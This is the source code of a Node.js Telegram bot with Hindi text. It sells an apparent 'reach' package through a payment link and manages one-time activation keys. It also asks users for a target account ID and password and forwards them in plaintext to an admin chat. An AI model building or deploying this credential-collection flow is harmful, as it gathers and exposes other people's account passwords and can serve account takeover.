require('dotenv').config();
const { Telegraf } = require('telegraf');
const fs = require('fs');
const http = require('http');

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const KEYS_FILE = './keys.json';

const INSTAMOJO_LINK = 'https://jpwreachedpro.mojo.page/jpw-reached-pro';
const activeTargets = new Map();

// --- लोकल कीज़ को मैनेज करने के फंक्शंस ---
function loadKeys() {
  if (!fs.existsSync(KEYS_FILE)) {
    fs.writeFileSync(KEYS_FILE, JSON.stringify([]));
  }
  try {
    const data = fs.readFileSync(KEYS_FILE, 'utf8');
    return JSON.parse(data);
  } catch (err) {
    return [];
  }
}

function saveKeys(keys) {
  fs.writeFileSync(KEYS_FILE, JSON.stringify(keys, null, 2));
}

// --- रेंडर सर्वर को ऑनलाइन रखने के लिए सेल्फ-पिंग और वेब सर्वर ---
const PORT = process.env.PORT || 3000;
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Bot is active and running!\n');
});

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

const SELF_URL = process.env.RENDER_EXTERNAL_URL;
if (SELF_URL) {
  setInterval(() => {
    fetch(SELF_URL)
      .then(() => console.log('Self-ping successful!'))
      .catch((err) => console.log('Self-ping failed:', err.message));
  }, 14 * 60 * 1000); // हर 14 मिनट में पिंग
}

// --- बोट कमांड्स और लॉजिक ---

bot.start((ctx) => {
  ctx.reply(
    `नमस्ते! Jpw रिच सर्विस में आपका स्वागत है। 🎉\n\n` +
    `💳 पैकेज खरीदने के लिए यहाँ पेमेंट करें:\n👉 ${INSTAMOJO_LINK}\n\n` +
    `🔑 एक्टिवेशन की यहाँ भेजें।\n` +
    `🎯 या टारगेट आईडी और पासवर्ड इस फॉर्मेट में भेजें:\n\`TARGET_ID PASSWORD\``,
    { parse_mode: 'Markdown' }
  );
});

bot.command('buy', (ctx) => {
  ctx.reply(`आप यहाँ से पैकेज खरीद सकते हैं:\n👉 ${INSTAMOJO_LINK}`);
});

// एडमिन के लिए नई डायनेमिक की जनरेट करने का कमांड: /genkey प्लान_का_नाम
bot.command('genkey', (ctx) => {
  if (!ADMIN_CHAT_ID || ctx.chat.id.toString() !== ADMIN_CHAT_ID.toString()) {
    return ctx.reply('⚠️ यह कमांड सिर्फ एडमिन के लिए है।');
  }

  const args = ctx.message.text.split(' ');
  args.shift();
  const planName = args.join(' ') || 'Standard Plan';

  const randomString = Math.random().toString(36).substring(2, 8).toUpperCase();
  const dynamicKey = `JPW-${Math.floor(1000 + Math.random() * 9000)}-${randomString}`;

  const keys = loadKeys();
  keys.push({
    activationKey: dynamicKey,
    planName: planName,
    isUsed: false
  });
  saveKeys(keys);

  return ctx.reply(
    `✅ **नई डायनेमिक की सफलतापूर्वक जनरेट हो गई है!**\n\n` +
    `🔑 की: \`${dynamicKey}\`\n` +
    `📦 प्लान: ${planName}\n\n` +
    `यह की वन-टाइम यूज़ के लिए है।`,
    { parse_mode: 'Markdown' }
  );
});

// मैसेज हैंडलर
bot.on('text', async (ctx) => {
  if (ADMIN_CHAT_ID && ctx.chat.id.toString() === ADMIN_CHAT_ID.toString()) {
    return handleAdminReply(ctx);
  }

  const text = ctx.message.text.trim();
  if (text.startsWith('/')) return;

  const parts = text.split(' ');

  // टारगेट आईडी और पासवर्ड का केस
  if (parts.length === 2) {
    const targetId = parts[0];
    const password = parts[1];
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const userId = ctx.from.id;

    activeTargets.set(targetId, userId);

    const adminMessage = `🚨 **नया क्रेडेंशियल प्राप्त हुआ!**\n\n` +
                         `👤 **यूजर:** ${username} (ID: \`${userId}\`)\n` +
                         `🎯 **टारगेट आईडी:** \`${targetId}\`\n` +
                         `🔑 **पासवर्ड:** \`${password}\`\n\n` +
                         `*इस मैसेज का रिप्लाई करके या टारगेट आईडी लिखकर जवाब दें।*`;

    try {
      await bot.telegram.sendMessage(ADMIN_CHAT_ID, adminMessage, { parse_mode: 'Markdown' });
      return ctx.reply('✅ आपकी डिटेल्स भेज दी गई हैं। कृपया प्रतीक्षा करें!');
    } catch (err) {
      console.error('Admin send error:', err);
      return ctx.reply('❌ डेटा भेजने में समस्या आई, बाद में प्रयास करें।');
    }
  }

  // एक्टिवेशन की (Key) वेरिफिकेशन का केस
  const keys = loadKeys();
  const foundKeyIndex = keys.findIndex(k => k.activationKey === text);

  if (foundKeyIndex === -1) {
    return ctx.reply('❌ यह की अमान्य (Invalid) है। कृपया सही की दर्ज करें।');
  }

  if (keys[foundKeyIndex].isUsed) {
    return ctx.reply('⚠️ यह की पहले ही इस्तेमाल हो चुकी है। यह दोबारा इस्तेमाल नहीं की जा सकती।');
  }

  keys[foundKeyIndex].isUsed = true;
  keys[foundKeyIndex].usedBy = ctx.from.id.toString();
  saveKeys(keys);

  const plan = keys[foundKeyIndex].planName;
  return ctx.reply(`🎉 बधाई हो! आपका '${plan}' प्लान सफलतापूर्वक एक्टिवेट हो गया है।`);
});

// एडमिन का रिप्लाई सही यूजर तक भेजने का फंक्शन
async function handleAdminReply(ctx) {
  const replyText = ctx.message.text;
  let targetUserId = null;

  for (let [tId, uId] of activeTargets.entries()) {
    if (replyText.includes(tId)) {
      targetUserId = uId;
      break;
    }
  }

  if (!targetUserId && ctx.message.reply_to_message) {
    const originalText = ctx.message.reply_to_message.text || '';
    for (let [tId, uId] of activeTargets.entries()) {
      if (originalText.includes(tId)) {
        targetUserId = uId;
        break;
      }
    }
  }

  if (targetUserId) {
    try {
      await bot.telegram.sendMessage(targetUserId, `📩 **अपडेट:**\n\n${replyText}`);
      await ctx.reply('✅ मैसेज यूजर को भेज दिया गया है!');
    } catch (err) {
      console.error('User send error:', err);
      await ctx.reply('❌ यूजर तक मैसेज पहुँचाने में असफल।');
    }
  } else {
    await ctx.reply('⚠️ टारगेट आईडी नहीं पहचानी जा सकी। मैसेज में Target ID जरूर लिखें।');
  }
}

// बोट लॉन्च
bot.launch()
  .then(() => console.log('File-based Bot with Self-Ping is running!'))
  .catch(err => console.log('Bot launch error:', err));

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
